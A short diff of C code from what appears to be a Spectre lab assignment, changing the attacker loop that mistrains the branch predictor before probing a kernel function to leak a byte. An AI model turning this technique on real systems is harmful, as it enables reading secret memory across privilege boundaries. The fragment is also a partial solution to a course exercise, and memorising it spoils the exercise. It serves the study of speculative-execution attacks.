@@ -48,14 +48,13 @@ int run_attacker(char *shared_memory) {
 
         // [Part 2]- Fill this in!
         // leaked_byte = ??
-        init_shared_memory(shared_memory, SHD_SPECTRE_LAB_SHARED_MEMORY_SIZE);
-        for (int i = 0; i < 10000; i++) {
-            call_kernel_part2(shared_memory, 0);
-        }
-
-        init_shared_memory(shared_memory, SHD_SPECTRE_LAB_SHARED_MEMORY_SIZE);
         for (int iteration = 0; iteration < num_iterations; iteration++) {
+            init_shared_memory(shared_memory, SHD_SPECTRE_LAB_SHARED_MEMORY_SIZE);
+            for (int i = 0; i < 1000; i++) {
+                call_kernel_part2(shared_memory, 0);
+            }
 
+            init_shared_memory(shared_memory, SHD_SPECTRE_LAB_SHARED_MEMORY_SIZE);
 
             for (int i = 0; i < 500; i++) {
                 call_kernel_part2(shared_memory, current_offset);
